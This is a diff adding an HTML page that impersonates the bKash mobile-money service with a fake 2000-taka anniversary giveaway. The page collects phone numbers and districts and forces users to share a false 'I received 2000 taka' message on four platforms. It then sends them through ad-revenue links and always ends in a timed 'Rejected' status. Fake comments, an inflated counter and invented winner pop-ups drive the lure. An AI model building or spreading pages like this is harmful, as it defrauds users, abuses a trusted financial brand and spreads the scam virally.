@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>bKash বার্ষিকী ক্যাম্পেইন ২০২৫</title>
+  <link href="https://fonts.googleapis.com/css?family=Hind+Siliguri:400,600&display=swap" rel="stylesheet">
+  <script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyBD8tW5sHlSze2E4E-EjXSjx9eMBdnneQ4",
+      authDomain: "free-money-9b371.firebaseapp.com",
+      databaseURL: "https://free-money-9b371-default-rtdb.firebaseio.com",
+      projectId: "free-money-9b371",
+      storageBucket: "free-money-9b371.firebasestorage.app",
+      messagingSenderId: "331937781056",
+      appId: "1:331937781056:web:ab7fdba321b4053be7d6a5",
+      measurementId: "G-ZGC6B44FDV"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+  </script>
+  <style>
+    /* ...styles unchanged... */
+    body {
+      font-family: 'Hind Siliguri', Arial, sans-serif;
+      background: linear-gradient(140deg, #f9e9ff 0%, #e9fff2 100%);
+      margin: 0;
+      padding: 0;
+      color: #222;
+      min-height: 100vh;
+    }
+    .navbar {
+      background: linear-gradient(90deg, #ef1666 60%, #ffb72f 100%);
+      color: #fff;
+      padding: 16px 0 14px 0;
+      text-align: center;
+      font-size: 25px;
+      font-weight: 800;
+      letter-spacing: .6px;
+      box-shadow: 0 2px 8px #e1e1e1;
+      position: relative;
+      z-index: 2;
+      border-bottom-left-radius: 30px;
+      border-bottom-right-radius: 30px;
+      text-shadow: 1px 1px 7px #0007;
+    }
+    .notification-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 999;
+      background: linear-gradient(90deg, #1fd7ff 10%, #ef1666 85%);
+      color: #ffe600;
+      font-size: 20px;
+      font-weight: 600;
+      text-align: center;
+      padding: 11px 0 10px 0;
+      transition: transform .4s;
+      transform: translateY(-120%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 13px;
+      letter-spacing: .2px;
+      box-shadow: 0 2px 14px #1112;
+      pointer-events: none;
+      user-select: none;
+      border-bottom-left-radius: 25px;
+      border-bottom-right-radius: 25px;
+    }
+    .notification-bar.show {
+      transform: translateY(0);
+      pointer-events: auto;
+      animation: popinnotif 0.5s;
+    }
+    @keyframes popinnotif {
+      from { opacity: 0; }
+      to { opacity: 1;}
+    }
+    .party-emoji {
+      font-size: 27px;
+      margin: 0 8px 0 0;
+      animation: pop 1s cubic-bezier(.21,.67,.93,.67) infinite alternate;
+    }
+    @keyframes pop {
+      0% { transform: scale(.85) rotate(-10deg);}
+      100% { transform: scale(1.22) rotate(10deg);}
+    }
+    .container {
+      max-width: 445px;
+      margin: 32px auto 28px auto;
+      background: #fff;
+      border-radius: 22px;
+      box-shadow: 0 3px 16px #e0e7ef;
+      padding: 0 0 28px 0;
+      overflow: hidden;
+      border-top: 7px solid #ef1666;
+      border-bottom: 6px solid #1fd7ff;
+    }
+    .header-img {
+      width: 100%;
+      display: block;
+      border-top-left-radius: 18px;
+      border-top-right-radius: 18px;
+      box-shadow: 0 2px 9px #ef167912;
+    }
+    .headline {
+      color: #ef1666;
+      text-align: center;
+      font-size: 28px;
+      font-weight: 800;
+      margin: 32px 0 7px 0;
+      letter-spacing: 1px;
+      text-shadow: 0px 2px 5px #fff2;
+    }
+    .sub-headline {
+      color: #333;
+      text-align: center;
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 18px;
+    }
+    .notice-bar {
+      background: linear-gradient(90deg, #1fd7ff 10%, #ef1666 85%);
+      color: #ffe600;
+      text-align: center;
+      padding: 10px 0;
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: .7px;
+      margin-bottom: 14px;
+      border-radius: 13px;
+      box-shadow: 0 1px 8px #cceeff55;
+    }
+    .input-section {
+      margin: 12px 0 22px 0;
+      text-align: center;
+    }
+    .input-section input,
+    .input-section select {
+      width: 84%;
+      padding: 13px;
+      font-size: 20px;
+      border: 2px solid #ffb72f;
+      border-radius: 10px;
+      margin-bottom: 17px;
+      outline: none;
+      transition: border .2s;
+      text-align: center;
+      background: #fbfbfe;
+      color: #222;
+    }
+    .input-section input:focus, .input-section select:focus {
+      border: 2px solid #ef1666;
+      background: #f3f5ff;
+    }
+    .input-section label {
+      display: block;
+      margin-bottom: 2px;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: left;
+      margin-left: 10%;
+      color: #ef1666;
+    }
+    .btn {
+      background: linear-gradient(90deg, #ef1666 60%, #ffb72f 100%);
+      color: #fff;
+      padding: 14px 45px;
+      font-size: 22px;
+      border: none;
+      border-radius: 11px;
+      cursor: pointer;
+      font-weight: 800;
+      margin-bottom: 13px;
+      margin-top: 6px;
+      transition: background 0.19s, scale .17s;
+      box-shadow: 0 2px 8px #ef167911;
+      letter-spacing: .7px;
+    }
+    .btn:disabled {
+      background: #fcc6d3;
+      color: #fff;
+      cursor: not-allowed;
+    }
+    .btn:active { scale: .97;}
+    .btn:hover:enabled {
+      background: linear-gradient(90deg, #ffb72f 10%, #ef1666 99%);
+    }
+    .social-share {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      gap: 13px;
+      margin: 21px 0 17px 0;
+      background: linear-gradient(90deg,#eaf6ff 60%, #fff9e7 100%);
+      border-radius: 13px;
+      padding: 14px 0 11px 0;
+      box-shadow: 0 1px 9px #cceeff11;
+    }
+    .social-btn {
+      background: #f1f1f1;
+      border: none;
+      border-radius: 50%;
+      width: 54px;
+      height: 54px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background .2s, transform .15s;
+      font-size: 26px;
+      color: #fff;
+      box-shadow: 0 2px 8px #ececf4;
+      border: 3px solid #fff1;
+    }
+    .social-btn.fb { background: #1877f2; }
+    .social-btn.ms { background: #0084ff; }
+    .social-btn.wa { background: #25d366; }
+    .social-btn.tw { background: #1da1f2; }
+    .social-btn:active { background: #bbb; transform: scale(.93);}
+    .social-btn.shared {
+      background: linear-gradient(90deg, #1fd7ff 10%, #ef1666 92%);
+      color: #ffe600;
+      border: 3px solid #ffe600;
+      animation: pop 1s cubic-bezier(.21,.67,.93,.67) 1;
+    }
+    .task-modal-bg {
+      position: fixed;
+      top:0; left:0; right:0; bottom:0;
+      background: rgba(36,36,36,.45);
+      display: none;
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+    }
+    .task-modal {
+      background: linear-gradient(120deg,#fff 80%,#f7e6ff 100%);
+      border-radius: 20px;
+      padding: 27px 22px 25px 22px;
+      max-width: 97vw;
+      width: 380px;
+      box-shadow: 0 3px 19px #0003;
+      text-align: center;
+      animation: popin .32s;
+    }
+    @keyframes popin {
+      from { scale: .82; opacity: 0;}
+      to { scale: 1; opacity: 1;}
+    }
+    .task-modal h2 {
+      color: #16b04a;
+      font-size: 23px;
+      font-weight: 800;
+      margin-top: 0;
+      margin-bottom: 7px;
+    }
+    .task-item-list {
+      margin: 16px 0 13px 0;
+      padding: 0;
+      list-style: none;
+      text-align: left;
+    }
+    .task-item-list li {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 11px;
+      font-size: 17px;
+      background: #f7f7fa;
+      border-radius: 8px;
+      padding: 10px 10px 10px 14px;
+      box-shadow: 0 1px 6px #eaf0f7;
+    }
+    .task-item-list button {
+      font-size: 15px;
+      padding: 7px 18px;
+      border-radius: 7px;
+      border: none;
+      background: linear-gradient(90deg, #ef1666 80%, #ffb72f 100%);
+      color: #fff;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .task-item-list button:disabled {
+      background: #1ab271;
+      color: #fff;
+      cursor: not-allowed;
+    }
+    .task-item-list .done {
+      background: #1ab271 !important;
+      color: #fff !important;
+    }
+    .modal-submit-btn {
+      margin-top: 22px;
+      width: 100%;
+      padding: 15px 0;
+      font-size: 20px;
+      background: linear-gradient(90deg, #1ab271 70%, #ffb72f 100%);
+      color: #fff;
+      border: none;
+      border-radius: 11px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background .13s;
+      box-shadow: 0 1px 5px #dcf7e5;
+    }
+    .modal-submit-btn:disabled {
+      background: #a3f2c3;
+      color: #fff;
+      cursor: not-allowed;
+    }
+    .pending-status {
+      margin: 36px auto 0 auto;
+      background: #fffbe8;
+      border: 1.5px solid #ffe58f;
+      color: #ef7b1c;
+      font-weight: 700;
+      font-size: 21px;
+      max-width: 87%;
+      text-align: center;
+      border-radius: 13px;
+      padding: 16px 0 11px 0;
+      box-shadow: 0 2px 9px #ffe4b544;
+    }
+    .rejected-status {
+      margin: 36px auto 0 auto;
+      background: #ffeaea;
+      border: 1.5px solid #ffb3b3;
+      color: #ef1666;
+      font-weight: 800;
+      font-size: 22px;
+      max-width: 87%;
+      text-align: center;
+      border-radius: 13px;
+      padding: 17px 0 13px 0;
+      box-shadow: 0 2px 9px #ffe4e4;
+      display: none;
+    }
+    .success-bar {
+      margin: 35px 0 2px 0;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 800;
+      color: #1ab271;
+      background: linear-gradient(90deg, #eafff2 60%, #fffbe8 100%);
+      padding: 22px 0 17px 0;
+      border-radius: 13px;
+      display: none;
+      border: 2px solid #1ab271;
+    }
+    .counter {
+      text-align: center;
+      color: #ef1666;
+      font-size: 23px;
+      margin-top: 8px;
+      letter-spacing: 2.6px;
+      font-weight: 800;
+      background: #fff;
+      border-radius: 8px;
+      padding: 7px 0;
+      max-width: 90%;
+      margin-left: auto;
+      margin-right: auto;
+      margin-bottom: 13px;
+      box-shadow: 0 1px 8px #ffe4e4;
+    }
+    .stats-bar {
+      padding: 13px 0 2px 0;
+      text-align: left;
+      font-size: 18px;
+      color: #222;
+      border-bottom: 1px solid #f2f2f2;
+      max-width: 93%;
+      margin: 0 auto 0 auto;
+      letter-spacing: .3px;
+    }
+    .stats-bar span {
+      margin-right: 21px;
+      font-weight: bold;
+      color: #ef1666;
+    }
+    .comments-section {
+      margin-top: 16px;
+      background: #f8f8fa;
+      border-radius: 11px;
+      box-shadow: 0 1px 3px #ededed22;
+      padding: 14px 7px 5px 7px;
+    }
+    .comment {
+      background: #fff;
+      margin-bottom: 10px;
+      border-radius: 9px;
+      padding: 10px 12px 10px 10px;
+      font-size: 16px;
+      color: #222;
+      box-shadow: 0 1px 6px #f0e9ec12;
+    }
+    .comment .user {
+      font-weight: bold;
+      color: #ef1666;
+      margin-right: 6px;
+    }
+    .comment .time {
+      font-size: 12px;
+      color: #858585;
+      margin-left: 8px;
+    }
+    .comment-input {
+      width: 92%;
+      padding: 8px;
+      margin: 10px 0 18px 0;
+      border-radius: 7px;
+      border: 1px solid #d1d7e0;
+      font-size: 15px;
+      outline: none;
+    }
+    .comment-btn {
+      font-size: 15px;
+      background: #ef1666;
+      color: #fff;
+      border: none;
+      border-radius: 7px;
+      padding: 7px 19px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-left: 8px;
+      transition: background .2s;
+    }
+    .comment-btn:disabled {
+      background: #fcc6d3;
+      cursor: not-allowed;
+    }
+    .faq-section {
+      margin: 32px 0 0 0;
+      background: linear-gradient(90deg,#f5faff 70%,#fff9e7 100%);
+      padding: 22px 10px;
+      border-radius: 13px;
+      max-width: 95%;
+      margin-left: auto;
+      margin-right: auto;
+      box-shadow: 0 1px 8px #cceeff33;
+    }
+    .faq-section h3 {
+      text-align: center;
+      color: #ef1666;
+      margin-bottom: 13px;
+      font-size: 20px;
+      font-weight: 800;
+    }
+    .faq-section details {
+      margin-bottom: 11px;
+    }
+    .faq-section summary {
+      font-weight: 700;
+      color: #222;
+      cursor: pointer;
+      outline: none;
+      font-size: 17px;
+    }
+    @media (max-width: 600px) {
+      .container { max-width: 100%; border-radius: 0; }
+      .header-img { border-radius: 0; }
+      .task-modal { width: 98vw; }
+    }
+  </style>
+  <!-- For icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+</head>
+<body>
+  <div class="notification-bar" id="notifBar">
+    <span class="party-emoji">🎉</span>
+    <span id="notifMsg"></span>
+  </div>
+  <div class="navbar">
+    bKash বার্ষিকী ক্যাম্পেইন ২০২৫
+  </div>
+  <div class="container" id="main-container">
+    <img src="https://cdn.glitch.global/eed70669-f9ad-4ac4-816a-bb97b1c939c8/bkash01.jpg?v=1751299753877" alt="bKash অফার" class="header-img">
+
+    <!-- Step 1: Number Entry and Details -->
+    <div id="step1">
+      <div class="headline">
+        <i class="fa-solid fa-gift"></i> ২০০০ টাকা বার্ষিকী পুরস্কার!
+      </div>
+      <div class="sub-headline">
+        bKash-এর বিশ্বস্ত গ্রাহকদের জন্য বিশেষ অফার – আপনার নির্দিষ্ট নম্বরে পেতে পারেন <span style="color:#ef1666;font-weight:bold;">৳২০০০</span> ক্যাশ পুরস্কার!
+      </div>
+      <div class="notice-bar">
+        bKash তার সকল ব্যবহারকারীদের জন্য ২০০০ টাকা বার্ষিকী ফান্ড ঘোষণা করেছে।
+      </div>
+      <form id="userDetailsForm" class="input-section" onsubmit="event.preventDefault();onUserDetailsSubmit();">
+        <label for="mobile">bKash মোবাইল নম্বর <span style="color:#ef1666">*</span></label>
+        <input type="tel" id="mobile" maxlength="11" placeholder="01XXXXXXXXX" autocomplete="off" required>
+        <label for="district">জেলা নির্বাচন করুন <span style="color:#ef1666">*</span></label>
+        <select id="district" required>
+          <option value="">জেলা নির্বাচন করুন</option>
+        </select>
+        <label for="upazila">উপজেলা / সিটি কর্পোরেশন (ঐচ্ছিক)</label>
+        <select id="upazila">
+          <option value="">উপজেলা / সিটি কর্পোরেশন নির্বাচন করুন</option>
+        </select>
+        <button class="btn" type="submit">পরবর্তী <i class="fa-solid fa-arrow-right"></i></button>
+      </form>
+    </div>
+
+    <!-- Step 2: Social Share Required -->
+    <div id="shareStep" style="display:none;">
+      <div class="notice-bar" style="margin-top:30px;">
+        <i class="fa-solid fa-share-nodes"></i> শেয়ার করুন এবং পরবর্তী ধাপ আনলক করুন
+      </div>
+      <div class="social-share" id="socialShareBar">
+        <button class="social-btn fb" id="fbShare" onclick="share('facebook')" title="ফেসবুকে শেয়ার করুন"><i class="fab fa-facebook-f"></i></button>
+        <button class="social-btn ms" id="msShare" onclick="share('messenger')" title="মেসেঞ্জারে শেয়ার করুন"><i class="fab fa-facebook-messenger"></i></button>
+        <button class="social-btn wa" id="waShare" onclick="share('whatsapp')" title="হোয়াটসঅ্যাপে শেয়ার করুন"><i class="fab fa-whatsapp"></i></button>
+        <button class="social-btn tw" id="twShare" onclick="share('twitter')" title="এক্স (X) এ শেয়ার করুন"><i class="fab fa-x-twitter"></i></button>
+      </div>
+      <div style="text-align:center;">
+        <button class="btn" id="shareNextBtn" onclick="unlockTasks()" disabled>পরবর্তী ধাপে যান</button>
+        <div style="margin-top:10px;color:#ef1666;font-weight:600;font-size:16px;">
+          সকল প্ল্যাটফর্মে শেয়ার করুন
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 3: Tasks Modal -->
+    <div class="task-modal-bg" id="taskModalBg">
+      <div class="task-modal" id="taskModal">
+        <h2><i class="fa-solid fa-list-check"></i> টাস্ক সম্পন্ন করুন</h2>
+        <p style="font-size:17px;font-weight:600;margin-bottom:15px;">
+          নাম্বার সাবমিট করতে এবং টাকা পেতে হলে <span style="color:#ef1666">দেখুন</span> বাটনে ক্লিক করুন:
+        </p>
+        <ul class="task-item-list" id="taskList"></ul>
+        <button class="modal-submit-btn" id="finalSubmitBtn" disabled onclick="showCongratulations()">অ্যাপ্লিকেশন সাবমিট করুন</button>
+      </div>
+    </div>
+
+    <!-- Step 4: Congratulations & Status -->
+    <div id="congratsStep" style="display:none;">
+      <div class="success-bar" style="display:block;">
+        <i class="fa-solid fa-check-circle"></i> অভিনন্দন!<br>আপনার আবেদন সফলভাবে সাবমিট হয়েছে।
+      </div>
+      <div class="pending-status" id="pendingStatus">
+        <i class="fa-solid fa-hourglass-half"></i> অ্যাপ্লিকেশন স্ট্যাটাস: <span style="color:#ef7b1c">Pending</span><br>
+        <span id="pendingTimerText" style="font-size:16px;"></span>
+      </div>
+      <div class="rejected-status" id="rejectedStatus">
+        <i class="fa-solid fa-times-circle"></i> দুঃখিত, আপনার আবেদন <span style="color:#ef1666">Rejected</span> হয়েছে।
+      </div>
+    </div>
+
+    <!-- Comments, stats, FAQ -->
+    <div class="counter" id="userCounter">
+      ৮,৯৬৩ অংশগ্রহণকারী
+    </div>
+    <div class="stats-bar">
+      <span><i class="fa fa-thumbs-up"></i> 137K</span> <span><i class="fa fa-comments"></i> 24K মন্তব্য</span> <span><i class="fa fa-share"></i> 14K শেয়ার</span>
+    </div>
+    <div class="comments-section" id="commentsSection">
+      <div class="comment"><span class="user">Abdullah Y</span> <span class="time">৫ মিনিট</span><br>প্রথমে ভাবছিলাম এটা ফেক, কিন্তু সত্যি পেলাম। ধন্যবাদ bKash!</div>
+      <div class="comment"><span class="user">R Paul</span> <span class="time">৭ মিনিট</span><br>আমি পেয়েছি, আমার বন্ধুরাও পেয়েছে। অসাধারণ অফার!</div>
+      <div class="comment"><span class="user">Habib M</span> <span class="time">১ মিনিট</span><br>ওয়াও! আমি এখনই টাকা পেয়েছি.. অসংখ্য ধন্যবাদ..</div>
+      <div class="comment"><span class="user">Akdar A</span> <span class="time">৪ মিনিট</span><br>খুব ভালো! ধন্যবাদ <i class="fa fa-heart" style="color:#ef1666;"></i></div>
+      <form id="commentForm" style="margin-top:10px;display:flex;gap:6px;align-items:center;">
+        <input class="comment-input" id="newComment" placeholder="একটি মন্তব্য লিখুন..." maxlength="120">
+        <button type="submit" class="comment-btn" id="commentBtn" disabled>পোস্ট</button>
+      </form>
+    </div>
+    <!-- FAQ -->
+    <div class="faq-section">
+      <h3>প্রায়শই জিজ্ঞাসা</h3>
+      <details>
+        <summary>কিভাবে টাকা পাব?</summary>
+        <div>নির্দেশনা অনুযায়ী শেয়ার ও টাস্ক সম্পন্ন করে আবেদন সফলভাবে সাবমিট করলে ৪৮ ঘণ্টার মধ্যে আপনার bKash একাউন্টে টাকা চলে যাবে (যদি আবেদন রিজেক্ট না হয়)।</div>
+      </details>
+      <details>
+        <summary>আমি কয়বার আবেদন করতে পারবো?</summary>
+        <div>একজন ব্যবহারকারী একবারই আবেদন করতে পারবেন।</div>
+      </details>
+      <details>
+        <summary>আমি টাকা না পেলে কি করবো?</summary>
+        <div>আপনার আবেদন স্ট্যাটাস চেক করুন অথবা আমাদের কাস্টমার কেয়ারে যোগাযোগ করুন।</div>
+      </details>
+    </div>
+  </div>
+  <script>
+    // District and Upazila/City data
+    const districtList = [
+      "ঢাকা","চট্টগ্রাম","রাজশাহী","খুলনা","বরিশাল","সিলেট","রংপুর","ময়মনসিংহ",
+      "কুমিল্লা","নোয়াখালী","ফরিদপুর","মাদারীপুর","গোপালগঞ্জ","শরিয়তপুর","টাঙ্গাইল","নরসিংদী",
+      "নারায়ণগঞ্জ","কিশোরগঞ্জ","গাজীপুর","জামালপুর","নেত্রকোনা","শেরপুর","মুন্সিগঞ্জ","ব্রাহ্মণবাড়িয়া",
+      "ফেনী","লক্ষ্মীপুর","চাঁদপুর","ভোলা","পটুয়াখালী","ঝালকাঠি","পিরোজপুর","বাগেরহাট",
+      "সাতক্ষীরা","মাগুরা","মেহেরপুর","ঝিনাইদহ","কুষ্টিয়া","চুয়াডাঙ্গা","নড়াইল","বগুড়া",
+      "নওগাঁ","জয়পুরহাট","চাঁপাইনবাবগঞ্জ","সিরাজগঞ্জ","পাবনা","রাজবাড়ী","ঠাকুরগাঁও","দিনাজপুর",
+      "কুড়িগ্রাম","নীলফামারী","লালমনিরহাট","পঞ্চগড়","গাইবান্ধা","সুনামগঞ্জ","হবিগঞ্জ","মৌলভীবাজার",
+      "খাগড়াছড়ি","বান্দরবান","রাঙ্গামাটি","কক্সবাজার","সাভার","বনগাঁ","শরীয়তপুর","শরিয়তপুর"
+    ];
+    // Upazila & City example data (expand as needed)
+    const upazilaData = {
+      "ঢাকা": [
+        "ঢাকা সিটি কর্পোরেশন (উত্তর)",
+        "ঢাকা সিটি কর্পোরেশন (দক্ষিণ)",
+        "সাভার",
+        "কেরানীগঞ্জ",
+        "দোহার",
+        "নবাবগঞ্জ"
+      ],
+      "চট্টগ্রাম": [
+        "চট্টগ্রাম সিটি কর্পোরেশন",
+        "পটিয়া",
+        "রাউজান",
+        "সীতাকুণ্ড"
+      ],
+      "রাজশাহী": [
+        "রাজশাহী সিটি কর্পোরেশন",
+        "পবা",
+        "চারঘাট",
+        "বাগমারা"
+      ],
+      "খুলনা": [
+        "খুলনা সিটি কর্পোরেশন", "দৌলতপুর", "ফুলতলা"
+      ],
+      "বরিশাল": [
+        "বরিশাল সিটি কর্পোরেশন","বাকেরগঞ্জ","গৌরনদী"
+      ],
+      "সিলেট": [
+        "সিলেট সিটি কর্পোরেশন","জৈন্তাপুর","বালাগঞ্জ"
+      ]
+      // ... (add more as needed)
+    };
+    // Populate district select
+    const districtSelect = document.getElementById('district');
+    districtList.forEach(d => {
+      const opt = document.createElement('option');
+      opt.value = d;
+      opt.innerText = d;
+      districtSelect.appendChild(opt);
+    });
+    // Populate upazila/city select dynamically
+    districtSelect.addEventListener('change', function() {
+      const upazilaSelect = document.getElementById('upazila');
+      upazilaSelect.innerHTML = '<option value="">উপজেলা / সিটি কর্পোরেশন নির্বাচন করুন</option>';
+      const val = this.value;
+      if (upazilaData[val]) {
+        upazilaData[val].forEach(u => {
+          const opt = document.createElement('option');
+          opt.value = u;
+          opt.innerText = u;
+          upazilaSelect.appendChild(opt);
+        });
+      }
+    });
+
+    // Step 1: submit details, go to share step
+    function onUserDetailsSubmit() {
+      const mobile = document.getElementById('mobile').value.trim();
+      const district = document.getElementById('district').value;
+      if (!/^01[3-9]\d{8}$/.test(mobile)) {
+        alert('সঠিক bKash মোবাইল নম্বর দিন (১১ সংখ্যার)');
+        return;
+      }
+      if (!district) {
+        alert('জেলা নির্বাচন করা আবশ্যক');
+        return;
+      }
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('shareStep').style.display = '';
+    }
+
+    // Social Share Logic
+    let shared = {facebook: false, messenger: false, whatsapp: false, twitter: false};
+    function share(network) {
+      const promoText = encodeURIComponent(
+        "আমি মাত্র ২০০০ টাকা সফলভাবে পেয়েছি! আপনারাও তারাতাড়ি করে ঢুকে ক্লেইম করে নিন: https://bkash-psi.vercel.app"
+      );
+      let url = "#";
+      if(network === 'facebook') {
+        url = `https://www.facebook.com/sharer/sharer.php?u=https://bkash-psi.vercel.app&quote=${promoText}`;
+      } else if(network === 'messenger') {
+        url = `https://www.facebook.com/dialog/send?link=https://bkash-psi.vercel.app&app_id=87741124305&redirect_uri=https://bkash-psi.vercel.app`;
+      } else if(network === 'whatsapp') {
+        url = `https://wa.me/?text=${promoText}`;
+      } else if(network === 'twitter') {
+        url = `https://twitter.com/intent/tweet?text=${promoText}`;
+      }
+      window.open(url, '_blank');
+      shared[network] = true;
+      document.getElementById(networkAbbr(network) + 'Share').classList.add('shared');
+      updateShareBtn();
+    }
+    function networkAbbr(network) {
+      if(network === 'facebook') return 'fb';
+      if(network === 'messenger') return 'ms';
+      if(network === 'whatsapp') return 'wa';
+      if(network === 'twitter') return 'tw';
+      return '';
+    }
+    function updateShareBtn() {
+      const allShared = shared.facebook && shared.messenger && shared.whatsapp && shared.twitter;
+      document.getElementById('shareNextBtn').disabled = !allShared;
+    }
+    function unlockTasks() {
+      document.getElementById('shareStep').style.display = 'none';
+      document.getElementById('taskModalBg').style.display = 'flex';
+      renderTasks();
+    }
+
+    // Tasks Logic
+    const taskNames = [
+      "নাম্বার সাবমিট করতে এবং টাকা পেতে হলে দেখুন বাটনে ক্লিক করুন",
+      "বিকাশ অ্যাপ সম্পর্কে বিস্তারিত জানুন",
+      "সেরা অফার গুলো দেখুন",
+      "নতুন ফিচার সম্পর্কে জানুন",
+      "bKash নিরাপত্তা টিপস",
+      "বিশ্বস্ত গ্রাহক অফার"
+    ];
+    const taskLinks = [
+      "https://www.profitableratecpm.com/bmbmsbhd3v?key=13e5f14a528c66ba996652128732357f",
+      "https://www.profitableratecpm.com/bmbmsbhd3v?key=13e5f14a528c66ba996652128732357f",
+      "https://www.profitableratecpm.com/bmbmsbhd3v?key=13e5f14a528c66ba996652128732357f",
+      "https://www.profitableratecpm.com/bmbmsbhd3v?key=13e5f14a528c66ba996652128732357f",
+      "https://www.profitableratecpm.com/bmbmsbhd3v?key=13e5f14a528c66ba996652128732357f",
+      "https://www.profitableratecpm.com/bmbmsbhd3v?key=13e5f14a528c66ba996652128732357f"
+    ];
+    let taskDone = [false,false,false,false,false,false];
+    function renderTasks() {
+      const ul = document.getElementById('taskList');
+      ul.innerHTML = "";
+      for(let i=0;i<6;i++) {
+        const li = document.createElement('li');
+        li.id = "task-li-"+i;
+        li.innerHTML = `
+          <span>${taskNames[i]}</span>
+          <button id="task-btn-${i}" onclick="doTask(${i})"${taskDone[i]?' disabled class="done"':''}>${taskDone[i]?"সম্পন্ন হয়েছে":"দেখুন"}</button>
+        `;
+        ul.appendChild(li);
+      }
+      updateTaskSubmitBtn();
+    }
+    window.doTask = function(idx) {
+      window.open(taskLinks[idx],"_blank");
+      taskDone[idx] = true;
+      const btn = document.getElementById('task-btn-'+idx);
+      btn.innerText = "সম্পন্ন হয়েছে";
+      btn.disabled = true;
+      btn.classList.add('done');
+      updateTaskSubmitBtn();
+    }
+    function updateTaskSubmitBtn() {
+      const allDone = taskDone.every(Boolean);
+      document.getElementById('finalSubmitBtn').disabled = !allDone;
+    }
+
+    // After tasks: show congratulations and pending status
+    function showCongratulations() {
+      document.getElementById('taskModalBg').style.display = 'none';
+      document.getElementById('congratsStep').style.display = '';
+      document.querySelector('.success-bar').style.display = 'block';
+      startPendingTimer();
+    }
+
+    // Pending -> Rejected logic
+    let pendingTimeoutId = null;
+    let pendingStartTimestamp = null;
+    function startPendingTimer() {
+      // For demo, use 15 seconds instead of 72 hours (259200000 ms)
+      const pendingDuration = 15000;
+      pendingStartTimestamp = Date.now();
+      updatePendingTimerText(pendingDuration);
+      pendingTimeoutId = setTimeout(function(){
+        document.getElementById('pendingStatus').style.display = 'none';
+        document.getElementById('rejectedStatus').style.display = 'block';
+      }, pendingDuration);
+    }
+    function updatePendingTimerText(duration) {
+      const timerText = document.getElementById('pendingTimerText');
+      function update() {
+        let left = Math.max(0, duration - (Date.now() - pendingStartTimestamp));
+        let h = Math.floor(left/3600000);
+        let m = Math.floor((left%3600000)/60000);
+        let s = Math.floor((left%60000)/1000);
+        timerText.innerText = `স্ট্যাটাস পরিবর্তন হতে বাকি ${h} ঘণ্টা ${m} মিনিট ${s} সেকেন্ড`;
+        if(left > 0) setTimeout(update, 1000);
+      }
+      update();
+    }
+
+    // Comment system
+    const commentInput = document.getElementById('newComment');
+    const commentBtn = document.getElementById('commentBtn');
+    commentInput.addEventListener('input', () => {
+      commentBtn.disabled = commentInput.value.trim().length < 2;
+    });
+    document.getElementById('commentForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      let val = commentInput.value.trim();
+      if(val.length < 2) return;
+      let min = Math.floor(Math.random()*5)+1;
+      addComment("আপনি", `${min} মিনিট`, val);
+      commentInput.value = '';
+      commentBtn.disabled = true;
+    });
+    function addComment(user, time, text) {
+      let c = document.createElement('div');
+      c.className = 'comment';
+      c.innerHTML = `<span class="user">${user}</span> <span class="time">${time}</span><br>${text}`;
+      const cs = document.getElementById('commentsSection');
+      cs.insertBefore(c, cs.children[cs.children.length-1]);
+    }
+
+    // Fake user counter animation
+    function animateCounter() {
+      let counterElem = document.getElementById('userCounter');
+      let num = 8963;
+      let target = num + Math.floor(Math.random()*6)+1;
+      let interval = setInterval(function(){
+        num++;
+        counterElem.innerText = num + " অংশগ্রহণকারী";
+        if(num >= target) clearInterval(interval);
+      }, 170);
+    }
+    animateCounter();
+
+    // Accessibility: enter on input
+    document.getElementById('mobile').addEventListener('keydown', function(e) {
+      if(e.key === 'Enter') e.preventDefault();
+    });
+
+    // Dynamic notification (top bar) logic
+    const notifBar = document.getElementById('notifBar');
+    const notifMsg = document.getElementById('notifMsg');
+    const districts = districtList;
+    const names = [
+      "শহিদুল","রহিম","করিম","আফজাল","তাসফিন","নাজমুল","শাকিল","রুবেল","রিমা","নাসরিন","শাহানা","ফারজানা","ইকবাল","মাসুদ","রিপন","হাসিব","আলভী","রাকিব","মিম","জাহিদ","তানভীর","সাবরিনা","তাসনিম","তৃষা","রিয়াজ","রাহাত","মোস্তাফিজ","নাজমা","তামান্না","সাব্বির","সাদিয়া","রবিউল","রাজু","মোস্তাকিম","সুজন","শামীম","মুনতাসির","মাহিন","মিম","নবীন","সুমনা","তানিয়া","নাবিলা","নাফিজ","রোমান","ফারুক","মাহফুজ","রফিক"
+    ];
+    function showDynamicNotification() {
+      const name = names[Math.floor(Math.random()*names.length)];
+      const district = districts[Math.floor(Math.random()*districts.length)];
+      notifMsg.innerHTML = `${district} থেকে <b>${name}</b> ২০০০ টাকা পেয়েছেন! <span class="party-emoji">🎉</span>`;
+      notifBar.classList.add('show');
+      setTimeout(() => {
+        notifBar.classList.remove('show');
+      }, 2400);
+    }
